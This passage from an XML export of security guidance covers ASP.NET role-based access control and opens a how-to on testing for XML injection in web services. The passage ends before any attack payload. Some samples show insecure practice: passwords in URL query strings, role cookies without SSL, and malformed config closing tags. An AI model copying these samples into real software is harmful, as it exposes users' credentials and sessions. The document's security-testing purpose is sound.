&lt;strong&gt;TestRole&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;If you click the &lt;strong&gt;Remove from role&lt;/strong&gt; button again before clicking the
&lt;strong&gt;Add to role&lt;/strong&gt; button, the call to &lt;strong&gt;Roles.RemoveUserFromRole&lt;/strong&gt; throws an exception because the user is already not in the role
&lt;strong&gt;TestUser&lt;/strong&gt; and cannot be removed twice. You must code for this condition in your applications.
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;To control access to pages and folders using roles&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A typical use for roles is to establish rules that allow or deny access to pages or folders. You can set up such access rules in the &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; section of the Web.config file. The following example allows users in the role of members
 to view pages in the folder named &lt;strong&gt;memberPages&lt;/strong&gt; and denies access to anyone else.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;location path=&amp;quot;memberPages&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;allow roles=&amp;quot;Manager&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/location&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;!-- other configuration settings here --&amp;gt;&lt;br&gt;&amp;lt;configuration&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Sample: Using WindowsTokenRoleProvider&lt;/h2&gt;
&lt;p&gt;This sample uses the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;To test role management with WindowsTokenRoleProvider &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Use Visual Studio&amp;nbsp;to create a Web site, add a Web.config file, and configure the
&lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; as described in step 2 of this How to. &lt;/li&gt;&lt;li&gt;Using the Internet Information Services MMC snap-in, edit the properties of the Web site. Edit the
&lt;strong&gt;Anonymous access and authentication control&lt;/strong&gt; on the &lt;strong&gt;Directory security&lt;/strong&gt; tab. Clear the
&lt;strong&gt;Anonymous access&lt;/strong&gt; check box and select the &lt;strong&gt;Integrated Windows Authentication&lt;/strong&gt; check box.
&lt;/li&gt;&lt;li&gt;In the Web.config file, enable Windows authentication.
&lt;div&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ...&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authentication mode=&amp;quot;Windows&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ...&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following code to Default.aspx.
&lt;div&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;!DOCTYPE html PUBLIC &amp;quot;-//W3C//DTD XHTML 1.1//EN&amp;quot; &amp;quot;&lt;a href="http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&lt;/a&gt;&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; string[] members = Roles.GetRolesForUser();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach (string role in members)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Label1.Text &amp;#43;= role &amp;#43; &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; } &lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;nbsp; &amp;gt;&lt;br&gt;&amp;lt;head runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;title&amp;gt;Untitled Page&amp;lt;/title&amp;gt;&lt;br&gt;&amp;lt;/head&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Label ID=&amp;quot;Label1&amp;quot; runat=&amp;quot;server&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the application. A list of roles that correspond to the Windows groups that the authenticated user is a member of is displayed. Note the following features about this application:
&lt;ol&gt;
&lt;li&gt;Because &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; is read-only, you cannot create, assign to, or remove users from roles. The
&lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; supports only the &lt;strong&gt;IsUserInRole &lt;/strong&gt;
and &lt;strong&gt;GetRolesForUser&lt;/strong&gt; methods of the role management API. &lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;The text of &lt;strong&gt;Label1&lt;/strong&gt; shows which Windows groups the currently logged on user is a member of.
&lt;/li&gt;&lt;li&gt;The &lt;strong&gt;WindowsPrincipal &lt;/strong&gt;class supports an override of the &lt;strong&gt;
IsInRole&lt;/strong&gt; method that accepts a &lt;strong&gt;WindowsBuiltinRole&lt;/strong&gt; enumeration. This method allows you to test against membership of common Windows groups. The
&lt;strong&gt;WindowsBuiltInRole&lt;/strong&gt; enumeration contains members representing common groups such as Administrators, Guest, PowerUser, and User as shown here.
&lt;div&gt;
&lt;div&gt;
&lt;div&gt;&lt;/div&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;pre&gt;WindowsPrincipal User = new &lt;br&gt;&amp;nbsp; WindowsPrincipal((WindowsIdentity)HttpContext.Current.User.Identity);&lt;br&gt;if (User.IsInRole(WindowsBuiltInRole.PowerUser))&lt;br&gt;{&lt;br&gt;&amp;nbsp; ...&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;To control access to pages and folders using built-in roles with the WindowsTokenRoleProvider&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;You can control access to pages or folders to members of one of the built-in Windows groups by specifying the role in the format
&lt;strong&gt;BUILTIN\&lt;em&gt;groupName&lt;/em&gt;&lt;/strong&gt;. The following example allows users in the built-in administrators group to view pages in the folder named memberPages and denies access to anyone else.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;location path=&amp;quot;memberPages&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;allow roles=&amp;quot;BUILTIN\Administrators&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/location&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp; &amp;lt;!-- other configuration settings here --&amp;gt;&lt;br&gt;&amp;lt;/configuration  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Additional Considerations&lt;/h1&gt;
&lt;p&gt;If a user's browser accepts cookies, you can store role information for that user in a cookie on the user's computer. On each page request, ASP.NET reads the role information for that user from the cookie. This can improve application performance by reducing
 the amount of communication required with the roles data store. &lt;/p&gt;
&lt;p&gt;To configure and enable role caching, set &lt;strong&gt;cacheRolesInCookie = true&lt;/strong&gt; as shown here.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;roleManager enabled=&amp;quot;true&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cacheRolesInCookie=&amp;quot;true&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieName=&amp;quot;.ASPXROLES&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieTimeout=&amp;quot;30&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookiePath=&amp;quot;/&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieRequireSSL=&amp;quot;false&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieSlidingExpiration=&amp;quot;true&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieProtection=&amp;quot;All&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; defaultProvider=&amp;quot;AspNetSqlRoleProvider&amp;quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; createPersistentCookie=&amp;quot;false&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; maxCachedResults=&amp;quot;25&amp;quot;/&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;If the role information for a user is too long to store in a cookie, ASP.NET stores only the most recently used role information in the cookie, and then it looks up additional role information in the data source as required.
&lt;/p&gt;
&lt;p&gt;To secure the role cookie: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set &lt;strong&gt;cookieRequireSSL&lt;/strong&gt; to &lt;strong&gt;true&lt;/strong&gt; to ensure the cookie is only used over an SSL protected channel.
&lt;/li&gt;&lt;li&gt;Set &lt;strong&gt;createPersistentCookie&lt;/strong&gt; to &lt;strong&gt;false&lt;/strong&gt; to prevent the cookie from being stored on the client computer, in which case the cookie is only used to protect the current session.
&lt;/li&gt;&lt;li&gt;Set &lt;strong&gt;cookieTimeout&lt;/strong&gt; to the number of minutes for which the cookie is valid.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>c929a261-7456-428c-b68f-cccc509239bc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for XML Injection Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority />
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies To:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web services that use XML communication protocols written in web languages such as ASP, PHP, Java, and similar languages.
&lt;/li&gt;&lt;li&gt;Web services that use SOAP communication.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;XML stands for Extensible Markup Language.&amp;nbsp; Similar to HTML, it utilizes tags to store structured data.&amp;nbsp; However, XML is extensible as it allows users to define their own elements in user defined tags.&lt;/p&gt;
&lt;p&gt;In web software, the two most noticeable uses for XML are: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Store structured data as an alternative to a database. &lt;/li&gt;&lt;li&gt;Provide a transaction protocol for business-to-business and business-to-client communications (such as SOAP.)&lt;/li&gt;&lt;/ol&gt;
&lt;h3&gt;&lt;em&gt;Store structured data as an alternative to a database&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;A server stores user names, passwords, and emails in the &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt; element.&amp;nbsp; It uses a web form to collect user data:&lt;/p&gt;
&lt;p&gt;&lt;img src=""&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A user enters the following data and clicks on the &lt;em&gt;Create User&lt;/em&gt; button:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;Username: JohnyC&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;strong&gt;Password: qwerty&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;E-mail: johnyc@examplesite.com&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;The client sends this URL to the server application:&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;http://www.examplesite.com/GetProfile.php?username=JohnyC&amp;amp;password=qwerty &amp;amp;email=JohnyC@examplesite.com&lt;/strong&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;Once the server receives the URL it creates a &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;
XML&lt;/em&gt; &lt;em&gt;element&lt;/em&gt; &lt;em&gt;node:&lt;/em&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&amp;lt;user&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;JohnyC&amp;lt;/username&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;userid&amp;gt;111&amp;lt;userid/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;mail&amp;gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;/user&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&amp;nbsp;&lt;/pre&gt;
&lt;h3&gt;&lt;em&gt;Provide a transaction protocol for business-to-business and business-to-client communications (such as SOAP)&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;The second and most used XML benefit is to integrate web services.&amp;nbsp; SOAP is the communication protocol for XML web services.&amp;nbsp; Before XML, systems had to implement Remote Procedure Calls (RPC) to integrate cross platform services on the web.&amp;nbsp; At that time
 COBRA or DCE were mostly used to achieve integration, but they were too complex.&amp;nbsp;&amp;nbsp; SOAP defined a standard XML communication protocol that was adopted because of its simplicity.&amp;nbsp; As Microsoft released SOAP, they also released a toolkit that translated COM
 to SOAP, as well as one to translate Java Functions to SOAP.&amp;nbsp;&amp;nbsp; &lt;/p&gt;
&lt;p&gt;The following code shows an XML-based SOAP client that invokes the &lt;strong&gt;sayHello
&lt;/strong&gt;method on a SOAP server&lt;a href="about:blank#_edn1" name="x__ednref1"&gt;[i]&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;Dim x, h&lt;/pre&gt;
&lt;pre&gt;Set x = CreateObject(&amp;quot;MSXML2.DOMDocument&amp;quot;)&lt;/pre&gt;
&lt;pre&gt;x.loadXML &amp;quot;&amp;lt;s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/' &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; xmlns:xsi='http://www.w3.org/1999/XMLSchema-instance' &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; xmlns:xsd='http://www.w3.org/1999/XMLSchema'&amp;gt;&amp;lt;s:Body&amp;gt;&amp;lt;m:sayHello &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; xmlns:m='urn:Example1'&amp;gt;&amp;lt;name xsi:type='xsd:string'&amp;gt;James&amp;lt;/name&amp;gt;&amp;lt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; /m:sayHello&amp;gt;&amp;lt;/s:Body&amp;gt;&amp;lt;/s:Envelope&amp;gt;&amp;quot;&lt;/pre&gt;
&lt;pre&gt;msgbox x.xml, , &amp;quot;Input SOAP Message&amp;quot;&lt;/pre&gt;
&lt;pre&gt;Set h = CreateObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;)&lt;/pre&gt;
&lt;pre&gt;h.open &amp;quot;POST&amp;quot;, &amp;quot;http://localhost:8080&amp;quot;&lt;/pre&gt;
&lt;pre&gt;h.send (x)&lt;/pre&gt;
&lt;pre&gt;while h.readyState &amp;lt;&amp;gt; 4&lt;/pre&gt;
&lt;pre&gt;wend&lt;/pre&gt;
&lt;pre&gt;msgbox h.responseText,,&amp;quot;Output SOAP Message&amp;quot;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
&lt;p&gt;For more information about XML Web Services, refer to theMSDN article on the topic&lt;a href="about:blank#_edn2" name="x__ednref2"&gt;[ii]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3&gt;&lt;em&gt;XML Injection Bugs&lt;/em&gt;&lt;/h3&gt;
&lt;p&gt;XML injection means to maliciously feed crafted data to a XML-based web service in order to execute an attack.&amp;nbsp; An XML injection attack varies from adding extra elements in an XML store to tamper with sensitive information to modifying XML store tags to
 execute cross-site scripting code in a target browser.&lt;/p&gt;
&lt;p&gt;The following steps are needed to test for XML Injection:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Understand XML Injection attack scenarios. &lt;/li&gt;&lt;li&gt;Identify high risk components. &lt;/li&gt;&lt;li&gt;Start testing and exploring. &lt;/li&gt;&lt;li&gt;Tune test cases.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Important: &lt;/strong&gt;&amp;nbsp;&amp;nbsp;It is necessary to differentiate XML injection with
&lt;strong&gt;&lt;em&gt;XPATH&lt;/em&gt;&lt;/strong&gt; or &lt;strong&gt;&lt;em&gt;XQUERY &lt;/em&gt;&lt;/strong&gt;bugs.&amp;nbsp; They are similar as they both relate to XML, but the logic involved is fundamentally different and will be discussed in individual articles.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand XML Injection attack scenarios&lt;/h1&gt;
&lt;p&gt;During the first step, you need to understand how an XML injection attack works both in storage and communication.&amp;nbsp; The following two scenarios elaborate on XML injection attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Injecting an extra tag to a XML data store. &lt;/li&gt;&lt;li&gt;Executing cross-site scripting attacks by manipulating the CDATA tag.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 1:&amp;nbsp; Injecting an extra tag to a XML data store&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;A bank site exposes a simple web page to create checking accounts. &amp;nbsp;It takes data from a web form like the one above and builds a URL like this one:&lt;/p&gt;
&lt;pre&gt;&lt;strong&gt;http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;amp;password=qwerty&amp;amp;email=JohnyC@examplesite.com&lt;/strong&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;The bank uses the data in the URL to construct the following XML in its data store:&lt;/p&gt;
&lt;pre&gt;&amp;lt;user&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;JohnyC&amp;lt;/username&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;userid&amp;gt;111&amp;lt;userid/&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;mail&amp;gt;JohnyC@examplesite.com&amp;lt;/mail&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;account type=”checking”&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;created&amp;gt;02-21-2008&amp;lt;/created&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;number&amp;gt;1249109&amp;lt;/number&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;balance&amp;gt;1201&amp;lt;/balance&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/account&amp;gt; &lt;/pre&gt;
&lt;pre&gt;&amp;nbsp;&lt;/pre&gt;
